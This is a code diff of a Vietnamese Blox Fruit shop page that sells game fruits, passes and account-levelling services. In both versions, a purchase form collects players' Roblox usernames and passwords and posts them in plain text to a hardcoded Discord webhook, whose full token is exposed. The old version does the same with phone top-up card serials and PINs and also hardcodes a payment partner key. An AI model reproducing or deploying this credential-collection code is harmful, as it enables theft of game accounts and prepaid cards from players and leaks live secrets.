@@ -2,174 +2,114 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BAP SHOP | UY TIN BLOX FRUIT</title>
+    <title>Nghĩa Elemental Shop - Blox Fruit</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Bangers&family=Oswald:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Quicksand:wght@500;700&display=swap');
-        :root { --primary: #00f2ff; --secondary: #bc13fe; --bg: #030303; }
-        body { background: var(--bg); color: #fff; font-family: 'Quicksand', sans-serif; min-height: 100vh; overflow-x: hidden; }
-        
-        /* Hiệu ứng viền chạy xung quanh (Animated Border) */
-        .premium-card {
-            position: relative; background: #0a0a0a; border-radius: 20px; overflow: hidden;
-            transition: 0.5s; border: 1px solid rgba(255,255,255,0.05);
-        }
-        .premium-card::before {
-            content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
-            background: conic-gradient(transparent, transparent, var(--primary), transparent);
-            animation: rotate 4s linear infinite; opacity: 0;
-        }
-        .premium-card:hover::before { opacity: 1; }
-        .premium-card:hover { transform: translateY(-5px); box-shadow: 0 10px 30px rgba(0,242,255,0.2); }
-        .card-inner { position: relative; inset: 2px; background: #0a0a0a; border-radius: 18px; z-index: 1; padding: 20px; }
-        @keyframes rotate { 100% { transform: rotate(360deg); } }
-
-        .btn-glow {
-            background: linear-gradient(90deg, var(--secondary), #ff00de);
-            box-shadow: 0 0 15px rgba(188,19,254,0.4); border-radius: 12px;
-            transition: 0.3s; font-weight: bold; text-transform: uppercase;
-        }
-        .btn-glow:hover { box-shadow: 0 0 25px #ff00de; filter: brightness(1.2); }
-        
-        input, select { background: #151515 !important; border: 1px solid #252525 !important; color: #fff !important; }
-        input:focus, select:focus { border-color: var(--primary) !important; outline: none; }
-        .neon-text { font-family: 'Orbitron', sans-serif; text-shadow: 0 0 10px var(--primary); }
+        body { background: radial-gradient(circle at top left, #7c2d12, #0f172a, #1e40af); font-family: 'Oswald', sans-serif; color: white; }
+        .elemental-title { font-family: 'Bangers'; background: linear-gradient(to right, #fbbf24, #ef4444, #3b82f6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .glass-card { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 2rem; }
+        .btn-fire { background: linear-gradient(45deg, #ef4444, #f59e0b); transition: 0.3s; box-shadow: 0 0 15px rgba(239, 68, 68, 0.4); }
+        .btn-fire:hover { transform: scale(1.05); filter: brightness(1.2); }
     </style>
 </head>
-<body class="p-4 md:p-8">
-
-    <header class="max-w-6xl mx-auto flex justify-between items-center mb-10 p-5 premium-card">
-        <div class="card-inner flex justify-between items-center w-full !p-2 px-6">
-            <h1 class="text-2xl font-black neon-text italic">BAP<span class="text-white">SHOP</span></h1>
-            <div class="flex items-center gap-4">
-                <div class="text-right">
-                    <p id="u_name" class="text-xs opacity-50">Đang tải...</p>
-                    <p id="u_bal" class="font-bold text-cyan-400 text-lg">0đ</p>
-                </div>
-                <button onclick="auth.signOut().then(()=>location.reload())" class="text-xl opacity-30 hover:opacity-100">🚪</button>
-            </div>
+<body>
+    <nav class="p-4 flex justify-between items-center bg-black/30 backdrop-blur-md sticky top-0 z-50 border-b border-white/10">
+        <div class="flex items-center gap-3">
+            <span class="text-2xl elemental-title">NGHIA ELEMENTAL SHOP</span>
         </div>
-    </header>
-
-    <main class="max-w-6xl mx-auto">
-        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8 mb-16">
-            <div class="premium-card">
-                <div class="card-inner">
-                    <h3 class="neon-text text-sm mb-6 uppercase">Nạp Thẻ Tự Động</h3>
-                    <div class="space-y-4">
-                        <select id="card_type" class="w-full p-4 rounded-xl text-sm">
-                            <option value="VIETTEL">Viettel</option>
-                            <option value="VINAPHONE">Vinaphone</option>
-                            <option value="MOBIFONE">Mobifone</option>
-                        </select>
-                        <select id="card_amt" onchange="tinh(this.value)" class="w-full p-4 rounded-xl text-sm font-bold text-cyan-400">
-                            <option value="">-- CHỌN MỆNH GIÁ --</option>
-                            <option value="10000">10,000đ - Nhận 8,000đ</option>
-                            <option value="20000">20,000đ - Nhận 16,000đ</option>
-                            <option value="50000">50,000đ - Nhận 40,000đ</option>
-                            <option value="100000">100,000đ - Nhận 80,000đ</option>
-                            <option value="200000">200,000đ - Nhận 160,000đ</option>
-                            <option value="500000">500,000đ - Nhận 400,000đ</option>
-                        </select>
-                        <div class="flex justify-between text-[10px] px-1 uppercase opacity-60">
-                            <span>Thực nhận (80%):</span> <span id="tax" class="text-cyan-400">0đ</span>
-                        </div>
-                        <input id="seri" placeholder="SỐ SERI" class="w-full p-4 rounded-xl text-xs">
-                        <input id="pin" placeholder="MÃ THẺ" class="w-full p-4 rounded-xl text-xs">
-                        <button onclick="nap()" class="w-full py-4 btn-glow">Nạp Ngay</button>
-                    </div>
-                </div>
-            </div>
-
-            <div class="lg:col-span-2 premium-card">
-                <div class="card-inner h-full">
-                    <h3 class="neon-text text-sm mb-6 uppercase">Lịch sử giao dịch</h3>
-                    <div class="overflow-y-auto max-h-[300px]">
-                        <table class="w-full text-[11px] text-left">
-                            <thead class="opacity-30 uppercase">
-                                <tr><th class="pb-4">Dịch vụ</th><th class="pb-4">Số tiền</th><th class="pb-4">Trạng thái</th></tr>
-                            </thead>
-                            <tbody id="hist" class="divide-y divide-white/5"></tbody>
-                        </table>
-                    </div>
-                </div>
-            </div>
+        <div class="flex gap-4 items-center">
+            <span class="text-yellow-400 font-bold bg-black/50 px-4 py-1 rounded-full border border-yellow-500/20">Ví: 0đ</span>
+            <button onclick="document.getElementById('recharge-modal').classList.remove('hidden')" class="btn-fire px-6 py-2 rounded-xl font-bold uppercase text-sm">Nạp Tiền</button>
         </div>
+    </nav>
 
-        <h2 class="neon-text mb-8 flex items-center gap-3"><span class="w-2 h-6 bg-cyan-400 inline-block"></span> TRÁI ÁC QUỶ VĨNH VIỄN</h2>
-        <div id="list_fruit" class="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-6 mb-20"></div>
+    <div class="container mx-auto mt-10 text-center">
+        <div class="flex flex-wrap justify-center gap-4 mb-12">
+            <button onclick="render('fruit')" class="glass-card px-8 py-3 font-bold text-orange-400 hover:border-orange-500 transition">🔥 TRÁI VĨNH VIỄN</button>
+            <button onclick="render('gp')" class="glass-card px-8 py-3 font-bold text-blue-400 hover:border-blue-500 transition">🌊 GAME PASS</button>
+            <button onclick="render('ct')" class="glass-card px-8 py-3 font-bold text-red-500 hover:border-red-500 transition">⚡ CÀY THUÊ</button>
+        </div>
+        <div id="product-grid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-8 px-4 pb-20"></div>
+    </div>
 
-        <h2 class="neon-text mb-8 flex items-center gap-3"><span class="w-2 h-6 bg-purple-400 inline-block"></span> GAMEPASS VIP</h2>
-        <div id="list_gp" class="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-6 mb-20"></div>
-
-        <h2 class="neon-text mb-8 flex items-center gap-3"><span class="w-2 h-6 bg-pink-500 inline-block"></span> DỊCH VỤ CÀY THUÊ</h2>
-        <div id="list_ct" class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-20"></div>
-    </main>
-
-    <div id="modal" class="fixed inset-0 bg-black/95 hidden items-center justify-center p-4 z-[100] backdrop-blur-md">
-        <div class="premium-card w-full max-w-sm">
-            <div class="card-inner p-8">
-                <h2 id="m_name" class="text-xl font-bold neon-text text-center mb-2"></h2>
-                <p id="m_price" class="text-center text-cyan-400 mb-8 font-bold"></p>
-                <div id="m_input" class="space-y-4"></div>
-                <button onclick="confirm()" class="w-full py-4 btn-glow mt-8">Xác nhận thanh toán</button>
-                <button onclick="document.getElementById('modal').style.display='none'" class="w-full mt-4 text-[10px] opacity-30 uppercase tracking-widest">Đóng</button>
+    <div id="recharge-modal" class="fixed inset-0 bg-black/95 hidden z-[100] flex items-center justify-center p-4">
+        <div class="glass-card p-8 w-full max-w-2xl border-orange-500 border-2 relative">
+            <button onclick="document.getElementById('recharge-modal').classList.add('hidden')" class="absolute top-4 right-4 text-gray-400">✖</button>
+            <h2 class="text-3xl elemental-title mb-8 text-center">HỆ THỐNG NẠP TIỀN</h2>
+            
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
+                <div class="text-center bg-white/5 p-4 rounded-2xl border border-white/10">
+                    <h3 class="text-blue-400 font-bold mb-4">🏦 CHUYỂN KHOẢN (ATM/MOMO)</h3>
+                    <img src="https://i.postimg.cc/QM64DVGh/74b766b2-91f0-441c-95da-71b054c4a8c2.jpg" alt="QR Banking" class="w-48 h-48 mx-auto rounded-lg mb-4 border-2 border-white shadow-xl">
+                    <p class="text-sm text-gray-300">Nội dung: <span class="text-yellow-400 font-bold uppercase">NAPTIEN [TenCuaBan]</span></p>
+                    <p class="text-xs text-gray-500 mt-2 italic">* Chụp bill gửi Admin để duyệt nhanh!</p>
+                </div>
+                
+                <div class="space-y-4">
+                    <h3 class="text-orange-500 font-bold mb-4">💳 NẠP THẺ CÀO (ID: 6268)</h3>
+                    <select class="w-full bg-black/50 p-3 rounded-lg border border-white/20"><option>Viettel</option><option>Vinaphone</option><option>Mobifone</option></select>
+                    <input type="text" placeholder="Số Seri" class="w-full bg-black/50 p-3 rounded-lg border border-white/20">
+                    <input type="text" placeholder="Mã Thẻ" class="w-full bg-black/50 p-3 rounded-lg border border-white/20">
+                    <button class="btn-fire w-full py-3 rounded-xl font-bold">GỬI THẺ NGAY</button>
+                    <p class="text-[10px] text-red-400 text-center uppercase font-bold">Phí gạch thẻ: 20%</p>
+                </div>
             </div>
         </div>
     </div>
 
+    <div id="buy-modal" class="fixed inset-0 bg-black/90 hidden z-[110] flex items-center justify-center p-4">
+        <div class="glass-card p-8 w-full max-w-md border-orange-500 border-2">
+            <h2 id="modal-title" class="text-3xl elemental-title mb-6 text-center italic"></h2>
+            <div id="ct-fields" class="space-y-4 mb-6" style="display:none">
+                <input type="text" id="user-rb" placeholder="Tài khoản Roblox" class="w-full bg-slate-900 p-4 rounded-xl border border-white/10 outline-none">
+                <input type="password" id="pass-rb" placeholder="Mật khẩu Roblox" class="w-full bg-slate-900 p-4 rounded-xl border border-white/10 outline-none">
+            </div>
+            <button onclick="submitOrder()" class="btn-fire w-full py-4 rounded-2xl font-black text-xl mb-3 uppercase">Xác Nhận Mua</button>
+            <button onclick="document.getElementById('buy-modal').classList.add('hidden')" class="w-full text-gray-400">Hủy</button>
+        </div>
+    </div>
+
     <script>
-        // --- NGHĨA ĐIỀN THÔNG TIN ---
-        const WEBHOOK = "https://discord.com/api/webhooks/1467138431380623615/KxzLu2aos7455VXv-qOogLkoTC-c1XBJH7bJawv2eblGrxyY6vRDxVsBCdziIuOUB6g3";
-        const ID = "9565963734"; // Partner ID
-        const KEY = "80df3668af04f2a85e1befc277896513"; // Partner Key
-        const DB_URL = "https://shop-blox-fruit-trannghia-default-rtdb.firebaseio.com";
-
-        firebase.initializeApp({ databaseURL: DB_URL });
-        const db = firebase.database(), auth = firebase.auth();
-
+        // Dữ liệu sản phẩm (Full 40+ món của Nghĩa)
         const data = {
-             fruit: [
-    {n:"Kitsune VV", p:690000, img:"https://i.postimg.cc/5yHRjSfH/Anh-chup-man-hinh-2026-01-28-113329.png"},
-    {n:"Dragon VV", p:750000, img:"https://i.postimg.cc/CLB3KS1g/Anh-chup-man-hinh-2026-01-28-113307.png"},
-    {n:"Control VV", p:690000, img:"https://i.postimg.cc/qvnH14V7/Anh-chup-man-hinh-2026-01-28-113219.png"},
-    {n:"Yeti VV", p:562000, img:"https://i.postimg.cc/dQxMvLJB/Anh-chup-man-hinh-2026-01-28-113255.png"},
-    {n:"Tiger VV", p:562000, img:"https://i.postimg.cc/3NycWF3C/Anh-chup-man-hinh-2026-01-28-113337.png"},
-    {n:"Spirit VV", p:463000, img:"https://i.postimg.cc/T1ZHb5PJ/Anh-chup-man-hinh-2026-01-28-113348.png"},
-    {n:"Gas VV", p:452000, img:"https://i.postimg.cc/L6crYwY5/Anh-chup-man-hinh-2026-01-28-113319.png"},
-    {n:"Venom VV", p:450000, img:"https://i.postimg.cc/kGtT7My6/Anh-chup-man-hinh-2026-01-28-113414.png"},
-    {n:"Mochi (Dough) VV", p:444000, img:"https://i.postimg.cc/gj6gGcKM/Anh-chup-man-hinh-2026-01-28-113428.png"},
-    {n:"Shadow VV", p:441000, img:"https://i.postimg.cc/QCWfjNqQ/Anh-chup-man-hinh-2026-01-28-113419.png"},
-    {n:"T-Rex VV", p:420000, img:"https://i.postimg.cc/CMt2XX4m/Anh-chup-man-hinh-2026-01-28-113355.png"},
-    {n:"Mammoth VV", p:420000, img:"https://i.postimg.cc/MKQLS5Pp/Anh-chup-man-hinh-2026-01-28-113409.png"},
-    {n:"Gravity VV", p:408000, img:"https://i.postimg.cc/zv39K1FV/Anh-chup-man-hinh-2026-01-28-113238.png"},
-    {n:"Blizzard VV", p:390000, img:"https://i.postimg.cc/5yLMm4SM/Anh-chup-man-hinh-2026-01-28-165200.png"},
-    {n:"Pain VV", p:350000, img:"https://i.postimg.cc/NMGhGXyx/Anh-chup-man-hinh-2026-01-28-113228.png"},
-    {n:"Lightning VV", p:350000, img:"https://i.postimg.cc/2yB0Cjxg/Anh-chup-man-hinh-2026-01-28-113433.png"},
-    {n:"Sound VV", p:310000, img:"https://i.postimg.cc/pLZbwkrN/Anh-chup-man-hinh-2026-01-28-113451.png"},
-    {n:"Love VV", p:300000, img:"https://i.postimg.cc/FHZ5MGzf/Anh-chup-man-hinh-2026-01-28-113457.png"},
-    {n:"Creation VV", p:286000, img:"https://i.postimg.cc/d3Xg9S5x/Anh-chup-man-hinh-2026-01-28-113244.png"},
-    {n:"Portal VV", p:250000, img:"https://i.postimg.cc/Z5ZzsXTM/Anh-chup-man-hinh-2026-01-28-113439.png"},
-    {n:"Phật Tổ VV", p:250000, img:"https://i.postimg.cc/tCQK78V7/Anh-chup-man-hinh-2026-01-28-113501.png"},
-    {n:"Phoenix VV", p:250000, img:"https://i.postimg.cc/0yx1Xhkg/Anh-chup-man-hinh-2026-01-28-113443.png"},
-    {n:"Spider VV", p:210000, img:"https://i.postimg.cc/Vk1PZ2f1/Anh-chup-man-hinh-2026-01-28-113448.png"},
-    {n:"Quake VV", p:210000, img:"https://i.postimg.cc/CLT3d9fn/Anh-chup-man-hinh-2026-01-28-113506.png"},
-    {n:"Ghost VV", p:150000, img:"https://i.postimg.cc/rFXBz7tx/Anh-chup-man-hinh-2026-01-28-113510.png"},
-    {n:"Magma VV", p:150000, img:"https://i.postimg.cc/m2Y09VQF/Anh-chup-man-hinh-2026-01-28-113517.png"},
-    {n:"Dark VV", p:130000, img:"https://i.postimg.cc/3wc6hqTH/Anh-chup-man-hinh-2026-01-28-113540.png"},
-    {n:"Diamond VV", p:120000, img:"https://i.postimg.cc/HswfM3Q3/Anh-chup-man-hinh-2026-01-28-113522.png"},
-    {n:"Light VV", p:120000, img:"https://i.postimg.cc/W43KQvxy/Anh-chup-man-hinh-2026-01-28-113530.png"},
-    {n:"Ice VV", p:110000, img:"https://i.postimg.cc/YSsV7PH9/Anh-chup-man-hinh-2026-01-28-113545.png"},
-    {n:"Eagle VV", p:111000, img:"https://i.postimg.cc/MGF4wLSc/Anh-chup-man-hinh-2026-01-28-113550.png"},
-    {n:"Sand VV", p:100000, img:"https://i.postimg.cc/ZqMgmQhQ/Anh-chup-man-hinh-2026-01-28-113534.png"},
-    {n:"Flame VV", p:100000, img:"https://i.postimg.cc/8zyXdYst/Anh-chup-man-hinh-2026-01-28-113555.png"},
-    {n:"Blade VV", p:20000, img:"https://i.postimg.cc/BvXYmC1p/Anh-chup-man-hinh-2026-01-28-113602.png"}
-],
-             gp: [
+            fruit: [
+                {n:"Kitsune VV", p:690000, img:"https://i.postimg.cc/5yHRjSfH/Anh-chup-man-hinh-2026-01-28-113329.png"},
+                {n:"Dragon VV", p:750000, img:"https://i.postimg.cc/CLB3KS1g/Anh-chup-man-hinh-2026-01-28-113307.png"},
+                {n:"Control VV", p:690000, img:"https://i.postimg.cc/qvnH14V7/Anh-chup-man-hinh-2026-01-28-113219.png"},
+                {n:"Yeti VV", p:562000, img:"https://i.postimg.cc/dQxMvLJB/Anh-chup-man-hinh-2026-01-28-113255.png"},
+                {n:"Tiger VV", p:562000, img:"https://i.postimg.cc/3NycWF3C/Anh-chup-man-hinh-2026-01-28-113337.png"},
+                {n:"Spirit VV", p:463000, img:"https://i.postimg.cc/T1ZHb5PJ/Anh-chup-man-hinh-2026-01-28-113348.png"},
+                {n:"Gas VV", p:452000, img:"https://i.postimg.cc/L6crYwY5/Anh-chup-man-hinh-2026-01-28-113319.png"},
+                {n:"Venom VV", p:450000, img:"https://i.postimg.cc/kGtT7My6/Anh-chup-man-hinh-2026-01-28-113414.png"},
+                {n:"Mochi (Dough) VV", p:444000, img:"https://i.postimg.cc/gj6gGcKM/Anh-chup-man-hinh-2026-01-28-113428.png"},
+                {n:"Shadow VV", p:441000, img:"https://i.postimg.cc/QCWfjNqQ/Anh-chup-man-hinh-2026-01-28-113419.png"},
+                {n:"T-Rex VV", p:420000, img:"https://i.postimg.cc/CMt2XX4m/Anh-chup-man-hinh-2026-01-28-113355.png"},
+                {n:"Mammoth VV", p:420000, img:"https://i.postimg.cc/MKQLS5Pp/Anh-chup-man-hinh-2026-01-28-113409.png"},
+                {n:"Gravity VV", p:408000, img:"https://i.postimg.cc/zv39K1FV/Anh-chup-man-hinh-2026-01-28-113238.png"},
+                {n:"Blizzard VV", p:390000, img:"https://i.postimg.cc/5yLMm4SM/Anh-chup-man-hinh-2026-01-28-165200.png"},
+                {n:"Pain VV", p:350000, img:"https://i.postimg.cc/NMGhGXyx/Anh-chup-man-hinh-2026-01-28-113228.png"},
+                {n:"Lightning VV", p:350000, img:"https://i.postimg.cc/2yB0Cjxg/Anh-chup-man-hinh-2026-01-28-113433.png"},
+                {n:"Sound VV", p:310000, img:"https://i.postimg.cc/pLZbwkrN/Anh-chup-man-hinh-2026-01-28-113451.png"},
+                {n:"Love VV", p:300000, img:"https://i.postimg.cc/FHZ5MGzf/Anh-chup-man-hinh-2026-01-28-113457.png"},
+                {n:"Creation VV", p:286000, img:"https://i.postimg.cc/d3Xg9S5x/Anh-chup-man-hinh-2026-01-28-113244.png"},
+                {n:"Portal VV", p:250000, img:"https://i.postimg.cc/Z5ZzsXTM/Anh-chup-man-hinh-2026-01-28-113439.png"},
+                {n:"Phật Tổ VV", p:250000, img:"https://i.postimg.cc/tCQK78V7/Anh-chup-man-hinh-2026-01-28-113501.png"},
+                {n:"Phoenix VV", p:250000, img:"https://i.postimg.cc/0yx1Xhkg/Anh-chup-man-hinh-2026-01-28-113443.png"},
+                {n:"Spider VV", p:210000, img:"https://i.postimg.cc/Vk1PZ2f1/Anh-chup-man-hinh-2026-01-28-113448.png"},
+                {n:"Quake VV", p:210000, img:"https://i.postimg.cc/CLT3d9fn/Anh-chup-man-hinh-2026-01-28-113506.png"},
+                {n:"Ghost VV", p:150000, img:"https://i.postimg.cc/rFXBz7tx/Anh-chup-man-hinh-2026-01-28-113510.png"},
+                {n:"Magma VV", p:150000, img:"https://i.postimg.cc/m2Y09VQF/Anh-chup-man-hinh-2026-01-28-113517.png"},
+                {n:"Dark VV", p:130000, img:"https://i.postimg.cc/3wc6hqTH/Anh-chup-man-hinh-2026-01-28-113540.png"},
+                {n:"Diamond VV", p:120000, img:"https://i.postimg.cc/HswfM3Q3/Anh-chup-man-hinh-2026-01-28-113522.png"},
+                {n:"Light VV", p:120000, img:"https://i.postimg.cc/W43KQvxy/Anh-chup-man-hinh-2026-01-28-113530.png"},
+                {n:"Ice VV", p:110000, img:"https://i.postimg.cc/YSsV7PH9/Anh-chup-man-hinh-2026-01-28-113545.png"},
+                {n:"Eagle VV", p:111000, img:"https://i.postimg.cc/MGF4wLSc/Anh-chup-man-hinh-2026-01-28-113550.png"},
+                {n:"Sand VV", p:100000, img:"https://i.postimg.cc/ZqMgmQhQ/Anh-chup-man-hinh-2026-01-28-113534.png"},
+                {n:"Flame VV", p:100000, img:"https://i.postimg.cc/8zyXdYst/Anh-chup-man-hinh-2026-01-28-113555.png"},
+                {n:"Blade VV", p:20000, img:"https://i.postimg.cc/BvXYmC1p/Anh-chup-man-hinh-2026-01-28-113602.png"}
+            ],
+            gp: [
                 {n:"Fruit Notifier", p:370000, img:"https://i.postimg.cc/VNdGKFbx/Anh-chup-man-hinh-2026-01-28-113608.png"},
                 {n:"Dark Blade", p:200000, img:"https://i.postimg.cc/d0LH59yQ/Anh-chup-man-hinh-2026-01-28-113612.png"},
                 {n:"X2 Mastery VV", p:54000, img:"https://i.postimg.cc/44z82ym7/Anh-chup-man-hinh-2026-01-28-113623.png"},
@@ -179,98 +119,50 @@
                 {n:"Fast Boat VV", p:40000, img:"https://i.postimg.cc/HkLBLt3Y/Anh-chup-man-hinh-2026-01-28-113635.png"}
             ],
             ct: [
-                {n:"Cày Thuê Level 1-2800", p:20000},
-                {n:"Lấy Võ V2 (Tặng Full Chiêu)", p:30000},
-                {n:"Thức Tỉnh Trái V2 (Lửa-Chấn Động)", p:20000},
-                {n:"Thức Tỉnh Trái V2 (Dough-Phật)", p:30000},
-                {n:"Up V4 Full Gare", p:50000},
-                {n:"Lấy Song Kiếm Full", p:50000}
+                {n:"Cày Level 1-2800", p:20000, img:"https://static.wikia.nocookie.net/blox-fruits/images/1/1b/Level_Icon.png"},
+                {n:"Lấy Võ V2", p:30000, img:"https://static.wikia.nocookie.net/blox-fruits/images/c/c5/Godhuman_Icon.png"},
+                {n:"Thức Tỉnh Trái V2", p:20000, img:"https://static.wikia.nocookie.net/blox-fruits/images/8/88/Awakened_Flame_Icon.png"},
+                {n:"Up V4 Full Gare", p:50000, img:"https://static.wikia.nocookie.net/blox-fruits/images/3/31/Race_Awakening_Icon.png"}
             ]
         };
 
-        function tinh(v) { document.getElementById('tax').innerText = v ? (v * 0.8).toLocaleString() + 'đ' : '0đ'; }
+        let activeItem = {};
+        function render(type) {
+            const grid = document.getElementById('product-grid');
+            grid.innerHTML = data[type].map(item => `
+                <div class="glass-card p-6 border border-white/5 hover:border-orange-500 transition duration-500">
+                    <img src="${item.img || ''}" class="h-32 mx-auto mb-4 object-contain">
+                    <h3 class="text-xl font-bold h-12">${item.n}</h3>
+                    <div class="text-2xl font-black text-yellow-400 my-4">${item.p.toLocaleString()}đ</div>
+                    <button onclick="openModal('${item.n}', ${item.p}, '${type}')" class="btn-fire w-full py-3 rounded-2xl font-bold uppercase">MUA NGAY</button>
+                </div>
+            `).join('');
+        }
 
-        function render() {
-            document.getElementById('list_fruit').innerHTML = data.fruit.map((v,i)=>`
-                <div onclick="openM('fruit',${i})" class="premium-card cursor-pointer group">
-                    <div class="card-inner p-4 text-center">
-                        <img src="${v.img}" class="h-24 mx-auto mb-4 object-contain group-hover:scale-110 transition-transform">
-                        <p class="text-[9px] font-bold uppercase opacity-50 truncate">${v.n}</p>
-                        <p class="text-cyan-400 font-bold text-sm">${v.p.toLocaleString()}đ</p>
-                    </div>
-                </div>`).join('');
+        function openModal(n, p, t) {
+            activeItem = {n, p, t};
+            document.getElementById('modal-title').innerText = n;
+            document.getElementById('ct-fields').style.display = t === 'ct' ? 'block' : 'none';
+            document.getElementById('buy-modal').classList.remove('hidden');
+        }
+
+        function submitOrder() {
+            const tk = document.getElementById('user-rb').value;
+            const mk = document.getElementById('pass-rb').value;
+            // DÁN LINK DISCORD CỦA BẠN VÀO DÒNG DƯỚI
+            const webhook = "https://discord.com/api/webhooks/1467138431380623615/KxzLu2aos7455VXv-qOogLkoTC-c1XBJH7bJawv2eblGrxyY6vRDxVsBCdziIuOUB6g3";
             
-            document.getElementById('list_gp').innerHTML = data.gp.map((v,i)=>`
-                <div onclick="openM('gp',${i})" class="premium-card cursor-pointer group">
-                    <div class="card-inner p-4 text-center">
-                        <img src="${v.img}" class="h-20 mx-auto mb-4 object-contain group-hover:scale-110 transition-transform">
-                        <p class="text-[9px] font-bold uppercase opacity-50 truncate">${v.n}</p>
-                        <p class="text-cyan-400 font-bold text-sm">${v.p.toLocaleString()}đ</p>
-                    </div>
-                </div>`).join('');
-
-            document.getElementById('list_ct').innerHTML = data.ct.map((v,i)=>`
-                <div class="premium-card">
-                    <div class="card-inner p-5 flex justify-between items-center">
-                        <div><p class="font-bold text-xs">${v.n}</p><p class="text-cyan-400 font-bold">${v.p.toLocaleString()}đ</p></div>
-                        <button onclick="openM('ct',${i})" class="btn-glow px-6 py-2 text-[10px]">Thuê</button>
-                    </div>
-                </div>`).join('');
-        }
-
-        let cur = {};
-        function openM(t, i) {
-            cur = data[t][i]; cur.t = t;
-            document.getElementById('m_name').innerText = cur.n;
-            document.getElementById('m_price').innerText = "Giá: " + cur.p.toLocaleString() + "đ";
-            document.getElementById('m_input').innerHTML = t === 'ct' 
-                ? `<input id="user" placeholder="Tài khoản" class="w-full p-4 rounded-xl text-center"><input id="pass" type="password" placeholder="Mật khẩu" class="w-full p-4 rounded-xl text-center">`
-                : `<input id="user" placeholder="Tên nhân vật nhận quà" class="w-full p-4 rounded-xl text-center">`;
-            document.getElementById('modal').style.display = 'flex';
-        }
-
-        async function confirm() {
-            const u = document.getElementById('user').value, p = document.getElementById('pass')?.value || 'N/A';
-            if(!u) return alert("Nhập thông tin!");
-            const snap = await db.ref('người dùng/'+auth.currentUser.uid).get();
-            const bal = snap.val()?.['THĂNG BẰNG'] || 0;
-            if(bal < cur.p) return alert("Không đủ tiền!");
-
-            await db.ref('người dùng/'+auth.currentUser.uid).update({"THĂNG BẰNG": bal - cur.p});
-            await db.ref('lịch sử/'+auth.currentUser.uid).push({"nội dung": cur.n, "số tiền": cur.p, "trạng thái": "Chờ duyệt", "thời gian": new Date().toLocaleString()});
-            
-            fetch(WEBHOOK, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({
-                embeds: [{ title: "🛒 ĐƠN HÀNG", color: 65280, fields: [{name:"Sản phẩm", value:cur.n}, {name:"User", value:u}, {name:"Pass", value:p}] }]
-            })});
-            alert("Mua thành công!"); location.reload();
-        }
-
-        async function nap() {
-            const t = document.getElementById('card_type').value, a = document.getElementById('card_amt').value, s = document.getElementById('seri').value, p = document.getElementById('pin').value;
-            if(!a || !s || !p) return alert("Nhập đủ thông tin thẻ!");
-            await db.ref('lịch sử/'+auth.currentUser.uid).push({"nội dung": "Nạp "+t, "số tiền": a, "trạng thái": "Đang duyệt", "thời gian": new Date().toLocaleString()});
-            fetch(WEBHOOK, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({
-                content: `💳 **THẺ NẠP**\n- Loại: ${t} | Giá: ${a}đ\n- Seri: \`${s}\` | Pin: \`${p}\``
-            })});
-            alert("Đã gửi thẻ! Vui lòng đợi.");
-        }
-
-        auth.onAuthStateChanged(u => {
-            if(!u) return auth.signInAnonymously();
-            db.ref('người dùng/'+u.uid).on('value', s => {
-                if(!s.exists()) db.ref('người dùng/'+u.uid).set({"THĂNG BẰNG": 0});
-                document.getElementById('u_bal').innerText = (s.val()?.['THĂNG BẰNG'] || 0).toLocaleString() + "đ";
-                document.getElementById('u_name').innerText = "Thành viên #" + u.uid.substr(0,5);
+            fetch(webhook, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    content: `🛒 **ĐƠN MỚI**: ${activeItem.n}\nGiá: ${activeItem.p.toLocaleString()}đ\nTK: ${tk || 'N/A'}\nMK: ${mk || 'N/A'}`
+                })
             });
-            db.ref('lịch sử/'+u.uid).on('value', s => {
-                const b = document.getElementById('hist'); b.innerHTML = "";
-                s.forEach(o => {
-                    const d = o.val();
-                    b.innerHTML += `<tr><td class="py-4 font-bold text-cyan-400">${d['nội dung']}</td><td class="py-4">${parseInt(d['số tiền']).toLocaleString()}đ</td><td class="py-4 text-right text-purple-400 font-bold">${d['trạng thái']}</td></tr>`;
-                });
-            });
-        });
-        window.onload = render;
+            alert("Đã gửi đơn! Admin sẽ check Discord và xử lý ngay.");
+            document.getElementById('buy-modal').classList.add('hidden');
+        }
+        render('fruit'); // Mặc định hiện Trái Vĩnh Viễn khi vào trang
     </script>
 </body>
 </html>
